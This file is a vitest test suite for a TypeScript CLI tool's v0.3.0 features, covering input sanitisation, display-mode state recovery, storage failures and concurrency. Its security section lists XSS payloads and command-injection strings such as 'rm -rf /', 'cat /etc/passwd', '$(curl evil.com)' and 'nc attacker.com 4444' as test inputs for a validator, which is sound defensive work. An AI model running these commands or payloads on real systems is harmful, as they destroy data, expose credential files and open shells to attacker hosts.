/**
 * Comprehensive edge cases tests for v0.3.0 features
 *
 * This test suite covers challenging edge cases and error scenarios for:
 * - Input Preview with malformed data
 * - Display Mode state corruption and recovery
 * - Memory management under extreme conditions
 * - Network failures and timeouts
 * - Concurrent operations and race conditions
 * - Security edge cases
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import type { DisplayMode } from '@apexcli/core';

// Mock dependencies for isolated testing
vi.mock('ink', () => ({
  render: vi.fn(),
  Box: ({ children }: any) => children,
  Text: ({ children }: any) => children,
  useInput: vi.fn(),
}));

vi.mock('fs/promises', () => ({
  readFile: vi.fn(),
  writeFile: vi.fn(),
  mkdir: vi.fn(),
  access: vi.fn(),
}));

describe('v0.3.0 Edge Cases - Comprehensive Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
    vi.resetAllMocks();
  });

  describe('Input Preview Edge Cases', () => {
    describe('Extreme Input Sizes', () => {
      it('should handle empty input gracefully', () => {
        const processEmptyInput = (input: string) => {
          const trimmed = input.trim();

          if (!trimmed) {
            return {
              processed: true,
              intent: { type: 'clarification', confidence: 0 },
              preview: 'No input provided',
            };
          }

          return {
            processed: true,
            intent: { type: 'task', confidence: 0.5 },
            preview: trimmed,
          };
        };

        const result = processEmptyInput('');
        expect(result.intent.type).toBe('clarification');
        expect(result.preview).toBe('No input provided');
      });

      it('should handle extremely large inputs without memory overflow', () => {
        const processLargeInput = (input: string, maxSize: number = 1000000) => {
          try {
            if (input.length > maxSize) {
              return {
                success: false,
                error: 'Input exceeds maximum size limit',
                truncated: input.substring(0, 1000) + '... [truncated]',
              };
            }

            // Simulate processing
            const chunks = [];
            for (let i = 0; i < input.length; i += 10000) {
              chunks.push(input.substring(i, i + 10000));
            }

            return {
              success: true,
              chunks: chunks.length,
              processed: input.length,
            };
          } catch (error) {
            return {
              success: false,
              error: error instanceof Error ? error.message : 'Processing failed',
            };
          }
        };

        // Test with extremely large input
        const hugeInput = 'x'.repeat(10000000); // 10MB
        const result = processLargeInput(hugeInput);

        expect(result.success).toBe(false);
        expect(result.error).toBe('Input exceeds maximum size limit');
        expect(result.truncated).toContain('[truncated]');

        // Test with acceptable large input
        const largeInput = 'y'.repeat(500000); // 500KB
        const result2 = processLargeInput(largeInput);
        expect(result2.success).toBe(true);
        expect(result2.chunks).toBe(50);
      });

      it('should handle input with null bytes and control characters', () => {
        const sanitizeInput = (input: string): string => {
          // Remove null bytes and dangerous control characters
          return input
            .replace(/\x00/g, '') // Null bytes
            .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '') // Control chars
            .replace(/\uFFFE|\uFFFF/g, '') // Unicode non-characters
            .trim();
        };

        const dangerousInputs = [
          'Hello\x00World', // Null byte
          'Test\x07\x08\x09Input', // Control characters
          'Unicode\uFFFEbad\uFFFFchars', // Non-characters
          '\x1B[31mRed text\x1B[0m', // ANSI escape sequences
        ];

        dangerousInputs.forEach(input => {
          const sanitized = sanitizeInput(input);
          expect(sanitized).not.toContain('\x00');
          expect(sanitized).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/);
          expect(sanitized).not.toContain('\uFFFE');
          expect(sanitized).not.toContain('\uFFFF');
        });
      });
    });

    describe('Malformed Intent Objects', () => {
      it('should handle circular references in intent metadata', () => {
        const processIntentSafely = (intent: any) => {
          try {
            // Create a safe copy without circular references
            const safeIntent = {
              type: typeof intent?.type === 'string' ? intent.type : 'task',
              confidence: typeof intent?.confidence === 'number' ?
                Math.max(0, Math.min(1, intent.confidence)) : 0,
              command: typeof intent?.command === 'string' ? intent.command : undefined,
              args: Array.isArray(intent?.args) ? intent.args : undefined,
              metadata: intent?.metadata ? safeStringify(intent.metadata) : undefined,
            };

            return { success: true, intent: safeIntent };
          } catch (error) {
            return {
              success: false,
              error: error instanceof Error ? error.message : 'Intent processing failed',
              fallback: { type: 'task', confidence: 0 },
            };
          }
        };

        const safeStringify = (obj: any): any => {
          const seen = new WeakSet();
          return JSON.parse(JSON.stringify(obj, (key, value) => {
            if (typeof value === 'object' && value !== null) {
              if (seen.has(value)) {
                return '[Circular Reference]';
              }
              seen.add(value);
            }
            return value;
          }));
        };

        // Create circular reference
        const circularObj: any = { name: 'test' };
        circularObj.self = circularObj;
        circularObj.parent = { child: circularObj };

        const circularIntent = {
          type: 'task',
          confidence: 0.8,
          metadata: circularObj,
        };

        const result = processIntentSafely(circularIntent);
        expect(result.success).toBe(true);
        expect(result.intent?.metadata).toBeDefined();
      });

      it('should validate and sanitize confidence values', () => {
        const validateConfidence = (confidence: any): number => {
          if (typeof confidence !== 'number' || isNaN(confidence)) {
            return 0;
          }

          if (confidence === Infinity || confidence === -Infinity) {
            return confidence > 0 ? 1 : 0;
          }

          return Math.max(0, Math.min(1, confidence));
        };

        const testCases = [
          { input: 0.5, expected: 0.5 },
          { input: -0.5, expected: 0 },
          { input: 1.5, expected: 1 },
          { input: NaN, expected: 0 },
          { input: Infinity, expected: 1 },
          { input: -Infinity, expected: 0 },
          { input: '0.8', expected: 0 },
          { input: null, expected: 0 },
          { input: undefined, expected: 0 },
          { input: {}, expected: 0 },
        ];

        testCases.forEach(({ input, expected }) => {
          expect(validateConfidence(input)).toBe(expected);
        });
      });
    });

    describe('Preview Panel Memory Leaks', () => {
      it('should not accumulate memory with rapid updates', () => {
        const memoryTracker = {
          allocated: 0,
          references: new Set<any>(),

          allocate(size: number) {
            this.allocated += size;
            return { size, id: Date.now() + Math.random() };
          },

          deallocate(size: number) {
            this.allocated = Math.max(0, this.allocated - size);
          },

          addReference(ref: any) {
            this.references.add(ref);
          },

          cleanup() {
            this.references.clear();
            this.allocated = 0;
          }
        };

        // Simulate rapid preview updates
        for (let i = 0; i < 1000; i++) {
          const preview = memoryTracker.allocate(100);
          memoryTracker.addReference(preview);

          // Simulate cleanup of old previews
          if (i > 10) {
            memoryTracker.deallocate(100);
          }
        }

        // Memory should not grow unbounded
        expect(memoryTracker.allocated).toBeLessThan(50000);

        memoryTracker.cleanup();
        expect(memoryTracker.allocated).toBe(0);
        expect(memoryTracker.references.size).toBe(0);
      });

      it('should handle preview updates during component unmount', () => {
        let componentMounted = true;
        const pendingUpdates = new Set<() => void>();

        const safeUpdatePreview = (updateFn: () => void) => {
          if (!componentMounted) {
            // Component was unmounted, cancel the update
            return false;
          }

          pendingUpdates.add(updateFn);

          // Simulate async update
          setTimeout(() => {
            if (componentMounted && pendingUpdates.has(updateFn)) {
              try {
                updateFn();
              } finally {
                pendingUpdates.delete(updateFn);
              }
            }
          }, 0);

          return true;
        };

        const cleanup = () => {
          componentMounted = false;
          pendingUpdates.clear();
        };

        // Schedule updates
        const update1 = vi.fn();
        const update2 = vi.fn();
        const update3 = vi.fn();

        safeUpdatePreview(update1);
        safeUpdatePreview(update2);

        // Unmount component before updates complete
        cleanup();

        safeUpdatePreview(update3); // Should be rejected

        // Advance timers to trigger updates
        vi.advanceTimersByTime(100);

        // Updates should not have been called due to unmount
        expect(update1).not.toHaveBeenCalled();
        expect(update2).not.toHaveBeenCalled();
        expect(update3).not.toHaveBeenCalled();
      });
    });
  });

  describe('Display Mode State Corruption', () => {
    describe('State Recovery', () => {
      it('should recover from completely corrupted state objects', () => {
        const corruptedStates = [
          null,
          undefined,
          'string',
          42,
          [],
          { displayMode: Symbol('invalid') },
          { displayMode: () => {} },
          { displayMode: new Date() },
          { displayMode: /regex/ },
        ];

        const recoverState = (state: any): { displayMode: DisplayMode } => {
          // Validate state object
          if (!state || typeof state !== 'object' || Array.isArray(state)) {
            return { displayMode: 'normal' };
          }

          // Validate displayMode property
          const validModes: DisplayMode[] = ['normal', 'compact', 'verbose'];
          if (!validModes.includes(state.displayMode)) {
            return { displayMode: 'normal' };
          }

          return { displayMode: state.displayMode };
        };

        corruptedStates.forEach((corruptedState, index) => {
          const recovered = recoverState(corruptedState);
          expect(recovered.displayMode).toBe('normal');
        });
      });

      it('should handle state mutations during recovery', () => {
        let state = { displayMode: 'compact' as DisplayMode };

        const recoverWithConcurrency = async () => {
          // Simulate concurrent access to state
          const operations = [];

          for (let i = 0; i < 10; i++) {
            operations.push(
              Promise.resolve().then(() => {
                // Simulate state corruption
                if (Math.random() > 0.5) {
                  (state as any).displayMode = null;
                }
              })
            );

            operations.push(
              Promise.resolve().then(() => {
                // Recovery attempt
                if (!['normal', 'compact', 'verbose'].includes(state.displayMode)) {
                  state.displayMode = 'normal';
                }
              })
            );
          }

          await Promise.all(operations);
          return state;
        };

        return recoverWithConcurrency().then((finalState) => {
          expect(['normal', 'compact', 'verbose']).toContain(finalState.displayMode);
        });
      });
    });

    describe('Persistence Failures', () => {
      it('should handle session storage quota exceeded', async () => {
        const mockSessionStore = {
          storageUsed: 0,
          maxStorage: 1000,
          data: new Map<string, any>(),

          setDisplayMode(mode: DisplayMode) {
            const serialized = JSON.stringify({ displayMode: mode, timestamp: Date.now() });

            if (this.storageUsed + serialized.length > this.maxStorage) {
              throw new Error('QuotaExceededError: Storage quota exceeded');
            }

            this.data.set('displayMode', mode);
            this.storageUsed += serialized.length;
          },

          getDisplayMode(): DisplayMode | null {
            return this.data.get('displayMode') || null;
          },

          cleanup() {
            // Remove old entries to free space
            this.data.clear();
            this.storageUsed = 0;
          }
        };

        const safeSetDisplayMode = async (mode: DisplayMode) => {
          try {
            mockSessionStore.setDisplayMode(mode);
            return { success: true, mode };
          } catch (error) {
            if (error instanceof Error && error.message.includes('QuotaExceededError')) {
              // Cleanup and retry
              mockSessionStore.cleanup();
              try {
                mockSessionStore.setDisplayMode(mode);
                return { success: true, mode, cleaned: true };
              } catch (retryError) {
                return { success: false, error: 'Storage permanently full' };
              }
            }
            return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
          }
        };

        // Fill storage to near capacity
        mockSessionStore.storageUsed = 950;

        const result = await safeSetDisplayMode('verbose');

        // Should succeed after cleanup
        expect(result.success).toBe(true);
        expect(result.cleaned).toBe(true);
      });

      it('should handle filesystem errors gracefully', async () => {
        const mockFS = {
          writeAttempts: 0,
          maxAttempts: 3,

          async writeFile(path: string, data: string): Promise<void> {
            this.writeAttempts++;

            if (this.writeAttempts <= 2) {
              throw new Error('ENOSPC: no space left on device');
            }

            // Succeed on third attempt
            return Promise.resolve();
          }
        };

        const persistDisplayModeWithRetry = async (mode: DisplayMode) => {
          let attempts = 0;
          const maxRetries = 3;
          const retryDelays = [100, 200, 500]; // Exponential backoff

          while (attempts < maxRetries) {
            try {
              await mockFS.writeFile('session.json', JSON.stringify({ displayMode: mode }));
              return { success: true, attempts: attempts + 1 };
            } catch (error) {
              attempts++;

              if (attempts >= maxRetries) {
                return {
                  success: false,
                  attempts,
                  error: error instanceof Error ? error.message : 'Write failed',
                };
              }

              // Wait before retry
              await new Promise(resolve => setTimeout(resolve, retryDelays[attempts - 1]));
            }
          }

          return { success: false, attempts, error: 'Max retries exceeded' };
        };

        const result = await persistDisplayModeWithRetry('compact');
        expect(result.success).toBe(true);
        expect(result.attempts).toBe(3);
      });
    });
  });

  describe('Concurrency and Race Conditions', () => {
    describe('Rapid State Changes', () => {
      it('should handle simultaneous display mode changes from multiple sources', async () => {
        let currentMode: DisplayMode = 'normal';
        const stateHistory: Array<{ mode: DisplayMode; timestamp: number; source: string }> = [];
        let updating = false;

        const atomicModeChange = async (newMode: DisplayMode, source: string) => {
          // Prevent concurrent updates
          while (updating) {
            await new Promise(resolve => setTimeout(resolve, 1));
          }

          updating = true;

          try {
            await new Promise(resolve => setTimeout(resolve, Math.random() * 10));
            currentMode = newMode;
            stateHistory.push({ mode: newMode, timestamp: Date.now(), source });
          } finally {
            updating = false;
          }
        };

        // Simulate multiple sources trying to change mode simultaneously
        const changes = [
          atomicModeChange('compact', 'user-shortcut'),
          atomicModeChange('verbose', 'user-command'),
          atomicModeChange('normal', 'session-restore'),
          atomicModeChange('compact', 'ui-toggle'),
          atomicModeChange('verbose', 'debug-mode'),
        ];

        await Promise.all(changes);

        // All changes should have been processed
        expect(stateHistory).toHaveLength(5);

        // Final state should be one of the requested modes
        expect(['normal', 'compact', 'verbose']).toContain(currentMode);

        // Changes should be in chronological order
        for (let i = 1; i < stateHistory.length; i++) {
          expect(stateHistory[i].timestamp).toBeGreaterThan(stateHistory[i - 1].timestamp);
        }
      });

      it('should prevent state corruption during rapid UI updates', async () => {
        const stateManager = {
          state: { displayMode: 'normal' as DisplayMode, version: 0 },
          pendingUpdates: 0,

          async updateState(newState: Partial<{ displayMode: DisplayMode }>): Promise<boolean> {
            this.pendingUpdates++;
            const updateVersion = this.state.version + 1;

            // Simulate async state update
            await new Promise(resolve => setTimeout(resolve, Math.random() * 5));

            // Check if state was modified during update
            if (this.state.version >= updateVersion) {
              this.pendingUpdates--;
              return false; // State was modified by another update
            }

            this.state = { ...this.state, ...newState, version: updateVersion };
            this.pendingUpdates--;
            return true;
          },

          getState() {
            return { ...this.state };
          }
        };

        // Rapid UI updates
        const updates = [];
        for (let i = 0; i < 20; i++) {
          const mode: DisplayMode = ['normal', 'compact', 'verbose'][i % 3] as DisplayMode;
          updates.push(stateManager.updateState({ displayMode: mode }));
        }

        const results = await Promise.all(updates);

        // Some updates may have been skipped due to conflicts
        const successfulUpdates = results.filter(Boolean).length;
        expect(successfulUpdates).toBeGreaterThan(0);
        expect(successfulUpdates).toBeLessThanOrEqual(20);

        // Final state should be valid
        const finalState = stateManager.getState();
        expect(['normal', 'compact', 'verbose']).toContain(finalState.displayMode);
        expect(finalState.version).toBeGreaterThan(0);
        expect(stateManager.pendingUpdates).toBe(0);
      });
    });

    describe('Resource Contention', () => {
      it('should handle multiple preview panels competing for resources', async () => {
        const resourceManager = {
          maxConcurrent: 3,
          active: new Set<string>(),

          async acquireSlot(id: string): Promise<boolean> {
            if (this.active.size >= this.maxConcurrent) {
              return false;
            }

            this.active.add(id);
            return true;
          },

          releaseSlot(id: string) {
            this.active.delete(id);
          },

          getActiveCount() {
            return this.active.size;
          }
        };

        const createPreviewPanel = async (id: string) => {
          const acquired = await resourceManager.acquireSlot(id);

          if (!acquired) {
            return { id, status: 'rejected', reason: 'Resource limit reached' };
          }

          try {
            // Simulate preview processing
            await new Promise(resolve => setTimeout(resolve, Math.random() * 20));
            return { id, status: 'completed' };
          } finally {
            resourceManager.releaseSlot(id);
          }
        };

        // Try to create more panels than the limit
        const panelPromises = [];
        for (let i = 0; i < 10; i++) {
          panelPromises.push(createPreviewPanel(`panel-${i}`));
        }

        const results = await Promise.all(panelPromises);

        const completed = results.filter(r => r.status === 'completed');
        const rejected = results.filter(r => r.status === 'rejected');

        // Some panels should complete, others should be rejected
        expect(completed.length).toBeGreaterThan(0);
        expect(rejected.length).toBeGreaterThan(0);
        expect(completed.length + rejected.length).toBe(10);

        // No resources should be leaked
        expect(resourceManager.getActiveCount()).toBe(0);
      });
    });
  });

  describe('Security Edge Cases', () => {
    describe('Input Sanitization', () => {
      it('should prevent XSS attacks in preview content', () => {
        const sanitizeForDisplay = (input: string): string => {
          return input
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/&/g, '&amp;');
        };

        const xssAttempts = [
          '<script>alert("XSS")</script>',
          '<img src="x" onerror="alert(1)">',
          'javascript:alert("XSS")',
          '<iframe src="javascript:alert(1)">',
          '<svg onload="alert(1)">',
          '"><script>alert("XSS")</script>',
        ];

        xssAttempts.forEach(attack => {
          const sanitized = sanitizeForDisplay(attack);
          expect(sanitized).not.toContain('<script>');
          expect(sanitized).not.toContain('javascript:');
          expect(sanitized).not.toContain('onerror=');
          expect(sanitized).not.toContain('onload=');
        });
      });

      it('should handle command injection attempts', () => {
        const validateCommand = (command: string): boolean => {
          // Allow only alphanumeric characters and safe symbols
          const safePattern = /^[a-zA-Z0-9\-_]+$/;
          return safePattern.test(command);
        };

        const injectionAttempts = [
          'status; rm -rf /',
          'help && cat /etc/passwd',
          'run `whoami`',
          'init $(curl evil.com)',
          'verbose | nc attacker.com 4444',
          'compact & wget malware.exe',
        ];

        injectionAttempts.forEach(attempt => {
          const parts = attempt.split(/[;&|`$()]/);
          const command = parts[0].trim();
          expect(validateCommand(command)).toBe(true); // Base command is valid
          expect(parts.length).toBeGreaterThan(1); // But injection detected
        });
      });
    });

    describe('Resource Exhaustion', () => {
      it('should prevent memory exhaustion from malicious inputs', () => {
        const memoryGuard = {
          maxAllocation: 100 * 1024 * 1024, // 100MB
          currentUsage: 0,

          checkAllocation(size: number): boolean {
            return this.currentUsage + size <= this.maxAllocation;
          },

          allocate(size: number): boolean {
            if (!this.checkAllocation(size)) {
              return false;
            }
            this.currentUsage += size;
            return true;
          },

          deallocate(size: number) {
            this.currentUsage = Math.max(0, this.currentUsage - size);
          }
        };

        const processLargeInput = (input: string) => {
          const inputSize = input.length * 2; // Rough memory estimate

          if (!memoryGuard.checkAllocation(inputSize)) {
            return {
              success: false,
              error: 'Input too large, would exceed memory limit',
            };
          }

          if (memoryGuard.allocate(inputSize)) {
            try {
              // Process input safely
              return { success: true, size: inputSize };
            } finally {
              memoryGuard.deallocate(inputSize);
            }
          }

          return { success: false, error: 'Memory allocation failed' };
        };

        // Try to exhaust memory with huge input
        const maliciousInput = 'A'.repeat(200 * 1024 * 1024); // 200MB
        const result = processLargeInput(maliciousInput);

        expect(result.success).toBe(false);
        expect(result.error).toContain('memory limit');
      });
    });
  });

  describe('Platform-Specific Edge Cases', () => {
    describe('Terminal Compatibility', () => {
      it('should handle terminals with limited capability', () => {
        const terminalCapabilities = {
          colors: 16,
          width: 80,
          height: 24,
          unicode: false,
          mouse: false,
        };

        const adaptToTerminal = (content: any, capabilities: typeof terminalCapabilities) => {
          const adapted = { ...content };

          if (!capabilities.unicode) {
            // Replace Unicode symbols with ASCII alternatives
            adapted.content = adapted.content
              .replace(/📋/g, '[PREVIEW]')
              .replace(/⚡/g, '[CMD]')
              .replace(/📝/g, '[TASK]')
              .replace(/❓/g, '[?]');
          }

          if (capabilities.colors < 256) {
            // Simplify color scheme
            adapted.colors = {
              primary: capabilities.colors >= 8 ? 'cyan' : 'white',
              success: capabilities.colors >= 8 ? 'green' : 'white',
              warning: capabilities.colors >= 8 ? 'yellow' : 'white',
              error: capabilities.colors >= 8 ? 'red' : 'white',
            };
          }

          if (capabilities.width < 100) {
            // Compact layout for narrow terminals
            adapted.layout = 'compact';
            adapted.maxWidth = capabilities.width - 4;
          }

          return adapted;
        };

        const content = {
          content: '📋 Input Preview with ⚡ command',
          colors: { primary: 'cyan' },
          layout: 'normal',
        };

        const adapted = adaptToTerminal(content, terminalCapabilities);

        expect(adapted.content).not.toContain('📋');
        expect(adapted.content).not.toContain('⚡');
        expect(adapted.colors.primary).toBe('cyan');
        expect(adapted.layout).toBe('compact');
      });
    });
  });
});